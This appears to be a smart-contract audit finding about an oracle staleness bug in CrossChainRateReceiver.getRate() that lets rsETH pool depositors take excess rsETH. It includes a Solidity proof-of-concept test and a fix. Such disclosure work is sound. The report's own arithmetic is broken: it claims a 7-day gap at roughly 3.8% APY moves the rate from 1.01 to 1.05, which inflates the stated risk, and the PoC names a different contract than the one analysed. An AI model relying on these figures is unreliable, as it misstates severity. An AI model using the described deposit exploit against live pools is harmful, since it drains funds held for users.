### Title
Stale Oracle Rate in `CrossChainRateReceiver.getRate()` Enables Over-Issuance of rsETH from Pool Reserves — (`contracts/cross-chain/CrossChainRateReceiver.sol`)

---

### Summary

`CrossChainRateReceiver` stores `lastUpdated` but never enforces a maximum staleness window in `getRate()`. When LZ message delivery lapses and the true L1 rsETH/ETH rate rises, any caller of `RSETHPool.deposit()` receives more rsETH than the deposited ETH is worth at the current rate, draining the pool's pre-funded rsETH reserves.

---

### Finding Description

`CrossChainRateReceiver.getRate()` unconditionally returns the last stored `rate`: [1](#0-0) 

`lastUpdated` is written on every `lzReceive` call but is never read again anywhere in the contract: [2](#0-1) 

`RSETHPool.deposit()` calls `viewSwapRsETHAmountAndFee()`, which calls `getRate()` (delegating to the oracle) and computes:

```
rsETHAmount = amountAfterFee * 1e18 / rsETHToETHrate
``` [3](#0-2) 

The pool then transfers `rsETHAmount` of pre-funded `wrsETH` directly to the caller: [4](#0-3) 

If `rsETHToETHrate` is stale-low (e.g., 1.01e18 while the true L1 rate is 1.05e18), the division yields a larger `rsETHAmount` than the deposited ETH justifies at the current rate. The surplus rsETH is extracted from the pool's reserves.

`RSETHPoolV2.deposit()` has the same pattern — it mints rsETH directly using the stale rate: [5](#0-4) 

---

### Impact Explanation

The pool holds a pre-funded balance of `wrsETH`. An attacker who deposits `X` ETH when the oracle is stale receives:

```
rsETHAmount_stale  = X * 1e18 / staleRate      (e.g., X / 1.01e18)
rsETHAmount_fair   = X * 1e18 / currentRate    (e.g., X / 1.05e18)
profit             = rsETHAmount_stale - rsETHAmount_fair  ≈ 3.8% of X (in rsETH)
```

The excess rsETH is real value extracted from the pool's reserves. At scale (large pool balance, large deposit, significant rate drift), this constitutes direct theft of protocol-held funds.

---

### Likelihood Explanation

The rate update path is: L1 rate provider → LayerZero → `lzReceive` → `rate`. Any of the following realistic conditions creates a staleness window:

- LZ relayer downtime or congestion
- The off-chain keeper that triggers the L1 rate provider failing to call it
- Deliberate griefing of the LZ message queue

rsETH/ETH rate increases monotonically as staking rewards accrue (~3–5% APY), so even a 7-day gap produces a measurable and exploitable rate delta.

---

### Recommendation

Add a configurable `maxStaleness` threshold and revert in `getRate()` if the rate is too old:

```solidity
uint256 public maxStaleness; // e.g., 24 hours

function getRate() external view returns (uint256) {
    require(block.timestamp - lastUpdated <= maxStaleness, "Rate is stale");
    return rate;
}
``` [1](#0-0) 

Also expose `lastUpdated` in pool-level view functions so off-chain monitoring can alert before the window is exploited.

---

### Proof of Concept

```solidity
// Fork test (local, no mainnet)
function test_staleRateExploit() public {
    // 1. Deploy RSETHRateReceiver and RSETHPool pointing to it as oracle
    // 2. Simulate lzReceive with rate = 1.01e18
    receiver.lzReceive(srcChainId, srcAddressBytes, 0,
        abi.encode(uint256(1.01e18)));

    // 3. Warp 7 days — no further LZ message
    vm.warp(block.timestamp + 7 days);

    // 4. True L1 rate has moved to 1.05e18 (7 days * ~3.8% APY / 52 weeks)
    uint256 currentL1Rate = 1.05e18;

    // 5. Attacker deposits 10 ETH
    uint256 deposit = 10 ether;
    vm.deal(attacker, deposit);
    vm.prank(attacker);
    pool.deposit{value: deposit}("ref");

    uint256 received = wrsETH.balanceOf(attacker);
    uint256 fairAmount = deposit * 1e18 / currentL1Rate;

    // 6. Assert attacker received more than fair value
    assertGt(received, fairAmount);
    // profit ≈ 0.38 rsETH on a 10 ETH deposit
}
```

### Citations

**File:** contracts/cross-chain/CrossChainRateReceiver.sol (L95-97)
```text
        rate = _rate;

        lastUpdated = block.timestamp;
```

**File:** contracts/cross-chain/CrossChainRateReceiver.sol (L103-105)
```text
    function getRate() external view returns (uint256) {
        return rate;
    }
```

**File:** contracts/pools/RSETHPool.sol (L265-277)
```text
    function deposit(string memory referralId) external payable nonReentrant whenNotPaused {
        if (!isEthDepositEnabled) revert EthDepositDisabled();
        uint256 amount = msg.value;

        if (amount == 0) revert InvalidAmount();

        (uint256 rsETHAmount, uint256 fee) = viewSwapRsETHAmountAndFee(amount);

        feeEarnedInETH += fee;

        IERC20(address(wrsETH)).safeTransfer(msg.sender, rsETHAmount);

        emit SwapOccurred(msg.sender, rsETHAmount, fee, referralId);
```

**File:** contracts/pools/RSETHPool.sol (L311-319)
```text
    function viewSwapRsETHAmountAndFee(uint256 amount) public view returns (uint256 rsETHAmount, uint256 fee) {
        fee = amount * feeBps / 10_000;
        uint256 amountAfterFee = amount - fee;

        // rate of rsETH in ETH
        uint256 rsETHToETHrate = getRate();

        // Calculate the final rsETH amount
        rsETHAmount = amountAfterFee * 1e18 / rsETHToETHrate;
```

**File:** contracts/pools/RSETHPoolV2.sol (L207-218)
```text
    function deposit(string memory referralId) external payable nonReentrant whenNotPaused limitDailyMint(msg.value) {
        uint256 amount = msg.value;

        if (amount == 0) revert InvalidAmount();

        (uint256 rsETHAmount, uint256 fee) = viewSwapRsETHAmountAndFee(amount);

        feeEarnedInETH += fee;

        wrsETH.mint(msg.sender, rsETHAmount);

        emit SwapOccurred(msg.sender, rsETHAmount, fee, referralId);
```
